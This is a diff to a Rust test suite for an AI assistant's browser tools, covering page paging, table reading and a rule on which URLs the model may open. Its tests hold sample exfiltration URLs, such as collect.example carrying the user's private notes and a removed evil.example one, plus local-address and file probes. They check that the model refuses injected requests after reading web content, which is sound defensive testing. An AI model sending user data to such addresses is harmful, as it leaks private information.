@@ -32,7 +32,7 @@ impl Log {
 
 /// A call as a model that reads images and may act makes it, watched by `log`.
 async fn call(t: &mut Turn, name: &str, args: Value, log: &Log) -> Run {
-    let ctx = Ctx { gate: Gate::Look, act: true, provider: "anthropic", base_url: "https://api.anthropic.com/v1", live: Some(Live { sink: log, beside: None }) };
+    let ctx = Ctx { gate: Gate::Look, act: true, provider: "anthropic", base_url: "https://api.anthropic.com/v1", live: Some(Live { sink: log, beside: None }), outside: false, search: Some(crate::chat::pages::WEB_SEARCH) };
     execute(t, name, &args, &ctx).await
 }
 
@@ -82,7 +82,41 @@ fn web() -> Browser {
     p.insert("https://shop.example.com/".into(), SHOP.into());
     p.insert("https://shop.example.com/search?q=kettle".into(), "<html><head><title>Kettles - Example Shop</title></head><body><main><h1>3 kettles</h1><p>The Brass Kettle, £30.</p></main></body></html>".into());
     p.insert("https://shop.example.com/kettles".into(), "<html><head><title>Kettles</title></head><body><main><h1>Kettles</h1></main></body></html>".into());
+    p.insert(GUIDE.into(), guide());
+    p.insert(GEAR.into(), gear());
     Browser::new(&p)
+}
+
+/// A long guide (made up): three sections of about 4,000 characters each,
+/// links in the last.
+const GUIDE: &str = "https://guides.example.com/hiking";
+fn guide() -> String {
+    let words = |w: &str, n: usize| format!("{w} ").repeat(n);
+    format!(
+        r#"<html><head><title>Hill walking - Example Guides</title></head><body><main><h1>Hill walking</h1>
+  <h2>Boots</h2><p>{}</p>
+  <h2>Maps</h2><p>{}</p>
+  <h2>Weather</h2><p>{} Read <a href="https://weather.example.com/hills">the hill forecast</a>.</p>
+</main></body></html>"#,
+        words("lace", 800),
+        words("compass", 500),
+        words("cloud", 700)
+    )
+}
+
+/// A gear list in a big table (made up): headers, a link in each row, a row
+/// a filter hid; an ARIA grid of packs; a layout table around nothing.
+const GEAR: &str = "https://gear.example.com/list";
+fn gear() -> String {
+    let rows: String = (1..=180).map(|i| format!(r#"<tr><td><a href="/item/{i}">Item {i}</a></td><td>{i} g</td><td>Fort Joy</td></tr>"#)).collect();
+    format!(
+        r#"<html><head><title>Gear list - Example Gear</title></head><body><main><h1>Gear list</h1>
+  <h2>Everything</h2>
+  <table><thead><tr><th>Item</th><th>Weight</th><th>Where</th></tr></thead><tbody>{rows}<tr style="display:none"><td>Hidden item</td><td>0 g</td><td>Nowhere</td></tr></tbody></table>
+  <div role="grid" aria-label="Packs"><div role="row"><span role="columnheader">Pack</span><span role="columnheader">Litres</span></div><div role="row"><span role="gridcell">Day pack</span><span role="gridcell">20</span></div></div>
+  <table><tr><td>Just one cell</td></tr></table>
+</main></body></html>"#
+    )
 }
 
 /// The red of a stand-in shot: its page's scroll ÷ 8 (mod 256).
@@ -147,7 +181,11 @@ fn one_toolset_for_every_model_with_pages_acting_and_shots_only_where_they_may()
     let all = est(&instructions(Gate::Look, true)) + est(&definitions(Gate::Look, true).to_string());
     let acting = est(&instructions(Gate::Show, true)) + est(&definitions(Gate::Show, true).to_string());
     println!("the browser tools: {small} tokens (no pictures), {seeing} (pictures), {acting} (acting, no pictures), {all} (acting too)");
-    assert!(small <= 600 && acting <= 1200 && seeing <= 1000 && all <= 1550, "{small} / {acting} / {seeing} / {all}");
+    // (8 Nov 2026: browser_read's offset and tables, and what a search is for: 593 / 1187 / 966 / 1515.)
+    assert!(small <= 610 && acting <= 1200 && seeing <= 1000 && all <= 1550, "{small} / {acting} / {seeing} / {all}");
+    // Paging and tables, for every model that reads; a search is the person's.
+    let defs = definitions(Gate::Show, false).to_string();
+    assert!(defs.contains("\"offset\"") && defs.contains("\"tables\"") && defs.contains("results for the user: web search finds pages"), "{defs}");
     // The shapes the page and chats.json keep.
     let p = serde_json::to_value(ShownPage { url: MAP.into(), title: "T".into(), site: "s".into(), section: String::new() }).unwrap();
     assert_eq!(p, json!({ "url": MAP, "title": "T", "site": "s" }));
@@ -164,9 +202,13 @@ async fn navigate_opens_a_tab_from_a_link_the_person_gave_a_search_or_a_site_the
     assert_eq!(t.pages.shown, [ShownPage { url: MAP.into(), title: "maps.example.com".into(), site: "maps.example.com".into(), section: String::new() }]);
     assert!(log.kinds().contains(&"page".to_string()));
     assert!(!t.seen(), "nothing of the page went to the model");
-    // A page nobody gave: refused, saying how to get one.
-    let r = call(&mut t, TABS, json!({ "action": "new", "url": "https://evil.example/?notes=secret" }), &log).await.result;
-    assert_eq!(r["displayText"], "Didn't bring up evil.example/?notes=secret: not a link from you or the search");
+    // An address the model wrote, nothing from outside in the turn yet: it
+    // opens (an_address_the_model_writes_opens_only_before_outside_content).
+    let r = call(&mut t, TABS, json!({ "action": "new", "url": "https://www.example.com/forever" }), &log).await.result;
+    assert_eq!(r["displayText"], "Brought up example.com/forever beside the chat", "{r}");
+    // Not as plain http://: only from a link.
+    let r = call(&mut t, TABS, json!({ "action": "new", "url": "http://www.example.com/plain" }), &log).await.result;
+    assert_eq!(r["displayText"], "Didn't bring up example.com/plain: only https:// addresses on their own", "{r}");
     // Never this PC, another scheme or nothing.
     for (url, why) in [("http://127.0.0.1/admin", "never opens addresses on this PC"), ("file:///C:/Windows/win.ini", "only opens web pages"), ("", "url or search is required")] {
         let r = call(&mut t, TABS, json!({ "action": "new", "url": url, "search": "" }), &log).await.result;
@@ -176,12 +218,17 @@ async fn navigate_opens_a_tab_from_a_link_the_person_gave_a_search_or_a_site_the
     let mut t = turn("Can you open up ExampleTube, then search for train times");
     let r = call(&mut t, TABS, json!({ "action": "new", "url": "https://www.exampletube.com/" }), &log).await.result;
     assert_eq!(r["success"], true, "{r}");
-    assert_eq!(call(&mut t, TABS, json!({ "action": "new", "url": "https://www.exampletube.com/watch?v=abc" }), &log).await.result["success"], false);
+    // (Another of its pages: an address the model wrote, before anything from outside.)
+    assert_eq!(call(&mut t, TABS, json!({ "action": "new", "url": "https://www.exampletube.com/watch?v=abc" }), &log).await.result["success"], true);
     let r = call(&mut t, TABS, json!({ "action": "new", "search": "train times Kellbrook" }), &log).await.result;
     assert!(r["note"].as_str().unwrap().contains("doesn't read search engines' result pages"), "{r}");
     assert_eq!(t.pages.shown.last().unwrap().url, "https://duckduckgo.com/?q=train+times+Kellbrook");
     let r = call(&mut t, READ, json!({}), &log).await.result;
     assert_eq!(r["displayText"], "Didn't read duckduckgo.com/?q=train+times+Kellbrook: a search engine's results");
+    // What works instead: web search finds pages to open.
+    assert!(r["error"].as_str().unwrap().contains("To find pages to open, search with web_search: its results' links are yours to open with browser_navigate"), "{r}");
+    let opened = call(&mut t, TABS, json!({ "action": "new", "search": "kettles Kellbrook" }), &log).await.result;
+    assert!(opened["note"].as_str().unwrap().contains("To find pages to open yourself, search with web_search"), "{opened}");
     // A sign-in page the person linked themselves: opened, never asked about
     // (they asked for that page); the same address from a page read asks.
     let mut t = turn("Open https://shop.example.com/signin for me");
@@ -262,15 +309,27 @@ async fn the_model_scrolls_finds_a_heading_and_its_shot_is_of_the_scrolled_view_
     // Never a tab or a picture beside the chat.
     assert!(!log.kinds().iter().any(|k| k == "picture" || k == "page"), "{:?}", log.kinds());
     assert_eq!(t.pictures.shown.len(), 1, "kept with the answer, in the steps");
-    // A zoom into its bottom half: a crop, enlarged, its own step's shot.
+    // A zoom into its bottom half: a crop of the view drawn twice as finely
+    // (the stand-in draws out of sight), enlarged when small, its own step's shot.
     let zoom = call(&mut t, ZOOM, json!({ "region": "bottom-right" }), &log).await;
     assert_eq!(zoom.result["displayText"], "Zoomed in on the page · emberwiki.example", "{}", zoom.result);
-    assert_eq!(zoom.result["data"]["size"], "320×200", "160×100, enlarged twice");
+    assert_eq!(zoom.result["data"]["size"], "640×400", "320×200 of the view drawn at 640×400, enlarged twice");
+    assert_eq!((zoom.result["data"]["drawn"].clone(), zoom.result["data"]["density"].clone()), (json!(2.0), json!(2.0)), "{}", zoom.result);
     let zoomed = &log.shots()[1];
     let (rgba, w, _) = crate::snip::images::decode_png(&crate::snip::images::read(&zoomed.id).unwrap()).unwrap();
     // Its first pixel is the view's middle: green ~ half across, blue ~ half down.
-    assert!((rgba[1] as i32 - 128).abs() < 6 && (rgba[2] as i32 - 128).abs() < 8 && w == 320, "{:?}", &rgba[..4]);
-    assert!(zoom.looks[0].text.contains("aren't browser_click's"));
+    assert!((rgba[1] as i32 - 128).abs() < 6 && (rgba[2] as i32 - 128).abs() < 8 && w == 640, "{:?}", &rgba[..4]);
+    assert!(zoom.looks[0].text.contains("aren't browser_click's") && zoom.looks[0].text.contains("drawn at 2 times the screen's detail"), "{}", zoom.looks[0].text);
+    // Its tokens are counted from the picture the model gets: a PNG of the
+    // size said (`budget::part_size` reads its header).
+    let fitted = crate::snip::images::decode_png(&{
+        use base64::Engine;
+        let url = zoom.looks[0].part["image_url"]["url"].as_str().unwrap().to_string();
+        base64::engine::general_purpose::STANDARD.decode(url.split_once(',').unwrap().1).unwrap()
+    })
+    .unwrap();
+    assert_eq!((fitted.1, fitted.2), (640, 400));
+    assert!(zoom.looks[0].part["image_url"]["url"].as_str().unwrap().starts_with("data:image/png;base64,"));
     let ids: Vec<String> = log.shots().iter().map(|s| s.id.clone()).collect();
     crate::snip::images::delete(&ids);
     sim::install(None);
@@ -541,4 +600,148 @@ async fn reading_the_page_and_the_tabs_line() {
         assert!(about_open_page(q), "{q}");
     }
     assert!(!about_open_page("What's the weather in Kellbrook?"));
+}
+
+#[tokio::test]
+async fn an_address_the_model_writes_opens_only_before_outside_content() {
+    sim::install(Some(web()));
+    let mut t = turn("Open the Example Shop, then the hiking guide");
+    let log = Log::default();
+    // Nothing from outside yet: an address it knows opens (a new tab, then in that tab).
+    let r = call(&mut t, NAVIGATE, json!({ "url": "https://shop.example.com/" }), &log).await.result;
+    assert_eq!(r["displayText"], "Brought up shop.example.com beside the chat", "{r}");
+    assert!(!t.seen());
+    let r = call(&mut t, NAVIGATE, json!({ "url": GUIDE }), &log).await.result;
+    assert_eq!(r["displayText"], "Went to guides.example.com/hiking in tab 1", "{r}");
+    // (Going somewhere tells the page after: web content from here on.)
+    assert!(t.seen());
+    // After it: an address with the person's words in it, the way a page's
+    // words could have asked for it, is refused — in the tab, and as a new tab.
+    let secret = reqwest::Url::parse_with_params("https://collect.example/", &[("d", "my notes: dentist Tuesday 3pm, Kellbrook")]).unwrap().to_string();
+    let r = call(&mut t, NAVIGATE, json!({ "url": secret }), &log).await.result;
+    assert_eq!(r["success"], false, "{r}");
+    assert!(r["displayText"].as_str().unwrap().starts_with("Didn't go to collect.example/?d=my") && r["displayText"].as_str().unwrap().ends_with(": not a link from you, a search or the page"), "{r}");
+    let error = r["error"].as_str().unwrap();
+    assert!(error.contains("never an address you write") && error.contains("find the page with web_search"), "{error}");
+    let r = call(&mut t, TABS, json!({ "action": "new", "url": secret }), &log).await.result;
+    assert!(r["displayText"].as_str().unwrap().starts_with("Didn't bring up collect.example/") && r["success"] == false, "{r}");
+    assert!(!sim::with(|b| b.log.visited.iter().any(|v| v.contains("collect.example"))).unwrap(), "never went there");
+    // A link on a page read still opens (the page's own address for it);
+    // another page of that site the model writes doesn't.
+    call(&mut t, READ, json!({}), &log).await;
+    let r = call(&mut t, NAVIGATE, json!({ "url": "https://weather.example.com/other" }), &log).await.result;
+    assert_eq!(r["success"], false, "{r}");
+    let r = call(&mut t, NAVIGATE, json!({ "url": "https://weather.example.com/hills" }), &log).await.result;
+    assert_eq!(r["displayText"], "Went to weather.example.com/hills in tab 1", "{r}");
+    // Outside content the web side doesn't record (an agent's words, the
+    // screen, a connector's result, an answer before from the web): refused
+    // as well; with no web search, said so.
+    let mut fresh = turn("Open example.com's forever page");
+    let after = Ctx { outside: true, ..Ctx::quiet(Gate::Show, false) };
+    let r = execute(&mut fresh, TABS, &json!({ "action": "new", "url": "https://www.example.com/forever" }), &after).await.result;
+    assert_eq!(r["displayText"], "Didn't bring up example.com/forever: not a link from you, a search or the page", "{r}");
+    let blind = Ctx { search: None, ..after };
+    let r = execute(&mut fresh, TABS, &json!({ "action": "new", "url": "https://www.example.com/forever" }), &blind).await.result;
+    assert!(r["error"].as_str().unwrap().contains("ask the user for the address (this turn has no web search)"), "{r}");
+    // Before it, the same address opens.
+    let r = execute(&mut fresh, TABS, &json!({ "action": "new", "url": "https://www.example.com/forever" }), &Ctx::quiet(Gate::Show, false)).await.result;
+    assert_eq!(r["success"], true, "{r}");
+    sim::install(None);
+    // The rule alone: https only, a site's name, never this PC.
+    assert_eq!(written(" https://www.example.com/forever ", false, Some("web_search")).unwrap(), "https://www.example.com/forever");
+    assert!(written("http://www.example.com/", false, Some("web_search")).unwrap_err().contains("only as https://"));
+    assert!(written("https://192.168.1.4/", false, Some("web_search")).is_err());
+    assert!(written("https://www.example.com/", true, Some("WebSearch")).unwrap_err().contains("find the page with WebSearch"));
+}
+
+#[test]
+fn an_answer_before_from_the_web_counts_as_outside_content() {
+    use crate::chat::chats::{ChatMessage, Source};
+    let ask = |text: &str| ChatMessage { role: "user".into(), text: text.into(), ..Default::default() };
+    let web = ChatMessage { role: "assistant".into(), text: "The page says…".into(), sources: vec![Source { n: 1, url: "https://wiki.example.com/x".into(), ..Default::default() }], ..Default::default() };
+    let plain = ChatMessage { role: "assistant".into(), text: "Hello.".into(), ..Default::default() };
+    assert!(answer_before_from_web(&[ask("What does the wiki say?"), web.clone(), ask("Now open example.com/forever")]));
+    assert!(!answer_before_from_web(&[ask("Hi"), plain.clone(), ask("Open example.com/forever")]));
+    // Only the answer just before the question.
+    assert!(!answer_before_from_web(&[ask("What does the wiki say?"), web, ask("Thanks"), plain, ask("Open example.com/forever")]));
+    assert!(!answer_before_from_web(&[ask("Open example.com/forever")]));
+    assert!(!after_web_answer(None));
+}
+
+#[tokio::test]
+async fn a_long_page_is_read_in_parts_each_saying_where_to_go_on() {
+    sim::install(Some(web()));
+    sim::with(|b| b.open(GUIDE));
+    let mut t = turn("Read me the whole hiking guide");
+    // The first read: as it always was (no offset, no chars), with where to go on.
+    let first = plain(&mut t, READ, json!({})).await;
+    let keys: Vec<&String> = first["data"].as_object().unwrap().keys().collect();
+    assert_eq!(keys, ["headings", "links", "more", "n", "next", "tab", "tabs", "text", "title", "url"], "{first}");
+    assert_eq!(first["data"]["text"].as_str().unwrap().chars().count(), READ_MAX);
+    assert_eq!((first["data"]["more"].clone(), first["data"]["next"].clone()), (json!(true), json!({ "offset": READ_MAX })));
+    assert_eq!(first["displayText"], "Read guides.example.com/hiking beside the chat");
+    // On from there: the next 5,000 characters, the headings in them, its length.
+    let second = plain(&mut t, READ, first["data"]["next"].clone()).await;
+    let d = &second["data"];
+    assert_eq!((d["offset"].clone(), d["n"].clone()), (json!(READ_MAX), first["data"]["n"].clone()), "{second}");
+    let whole = sim::with(|b| b.text_up_to(&b.tabs()[0].key, read::TEXT_FULL).unwrap().text).unwrap();
+    assert_eq!(d["text"].as_str().unwrap(), whole.chars().skip(READ_MAX).take(READ_MAX).collect::<String>());
+    // (Boots and Maps start in the first part, Weather in this one.)
+    assert_eq!(d["headings"], json!(["Weather"]), "the heading in this part: {second}");
+    let total = d["chars"].as_u64().unwrap() as usize;
+    assert!(total > 2 * READ_MAX && total < 3 * READ_MAX, "{total}");
+    assert_eq!(d["next"], json!({ "offset": 2 * READ_MAX }));
+    assert_eq!(second["displayText"], "Read guides.example.com/hiking beside the chat (from character 5000)");
+    // The last part: no more, its link the page's (browser_navigate may open it).
+    let last = plain(&mut t, READ, json!({ "offset": 2 * READ_MAX })).await;
+    assert_eq!((last["data"]["more"].clone(), last["data"].get("next").is_none()), (json!(false), true), "{last}");
+    assert_eq!(last["data"]["links"], json!([{ "text": "the hill forecast", "url": "https://weather.example.com/hills" }]));
+    assert!(t.pages.links.iter().any(|l| l.url == "https://weather.example.com/hills"));
+    // Past the end: said how long it is.
+    let past = plain(&mut t, READ, json!({ "offset": 99_000 })).await;
+    assert!(past["error"].as_str().unwrap().contains(&format!("the page's text is {total} characters")), "{past}");
+    // Its elements, paged the same way.
+    sim::with(|b| {
+        let k = b.tabs()[0].key.clone();
+        b.navigate(&k, GEAR).unwrap();
+    });
+    let els = plain(&mut t, READ, json!({ "mode": "elements" })).await;
+    assert_eq!(els["data"]["next"], json!({ "mode": "elements", "offset": act::rules::MAX_ELEMENTS }), "{els}");
+    let on = plain(&mut t, READ, els["data"]["next"].clone()).await;
+    let lines = on["data"]["elements"].as_str().unwrap();
+    assert!(!lines.is_empty() && !lines.contains("more than"), "{lines}");
+    assert_eq!((on["data"]["offset"].clone(), on["data"]["more"].clone()), (json!(act::rules::MAX_ELEMENTS), json!(false)), "{on}");
+    sim::install(None);
+}
+
+#[tokio::test]
+async fn tables_are_read_as_rows_with_headers_and_links_paged_by_rows() {
+    sim::install(Some(web()));
+    sim::with(|b| b.open(GEAR));
+    let mut t = turn("What's in the gear list?");
+    let r = plain(&mut t, READ, json!({ "mode": "tables" })).await;
+    assert_eq!(r["displayText"], "Read 2 tables on gear.example.com/list beside the chat", "{r}");
+    let d = &r["data"];
+    // The big table (its hidden row left out) and the packs' grid; never the one-cell layout table.
+    assert_eq!((d["count"].clone(), d["rows"].clone()), (json!(2), json!(181)), "{r}");
+    let first = &d["tables"][0];
+    assert_eq!((first["caption"].clone(), first["headers"].clone(), first["of"].clone(), first["from"].clone()), (json!("Everything"), json!(["Item", "Weight", "Where"]), json!(180), json!(1)));
+    assert_eq!(first["rows"][0], json!([{ "text": "Item 1", "url": "https://gear.example.com/item/1" }, "1 g", "Fort Joy"]));
+    assert_eq!(first["rows"].as_array().unwrap().len(), read::TABLE_ROWS);
+    assert_eq!((d["more"].clone(), d["next"].clone()), (json!(true), json!({ "mode": "tables", "offset": read::TABLE_ROWS })));
+    assert!(t.seen() && t.pages.links.iter().any(|l| l.url == "https://gear.example.com/item/1"), "web content; its links may open");
+    // On from there: the rest of the big table, its headers again, then the grid.
+    let r = plain(&mut t, READ, d["next"].clone()).await;
+    let parts = r["data"]["tables"].as_array().unwrap();
+    assert_eq!(parts.len(), 2, "{r}");
+    assert_eq!((parts[0]["from"].clone(), parts[0]["rows"].as_array().unwrap().len(), parts[0]["headers"][0].clone()), (json!(101), 80, json!("Item")));
+    assert_eq!(parts[0]["rows"][79][0]["text"], "Item 180");
+    assert!(!r.to_string().contains("Hidden item"));
+    assert_eq!((parts[1]["caption"].clone(), parts[1]["headers"].clone(), parts[1]["rows"].clone()), (json!("Packs"), json!(["Pack", "Litres"]), json!([["Day pack", "20"]])));
+    assert!(r["data"].get("next").is_none());
+    // A page with none: said so.
+    sim::with(|b| b.open("https://shop.example.com/kettles"));
+    let r = plain(&mut t, READ, json!({ "mode": "tables" })).await;
+    assert_eq!((r["success"].clone(), r["displayText"].clone()), (json!(true), json!("Found no tables on shop.example.com/kettles")), "{r}");
+    sim::install(None);
 }
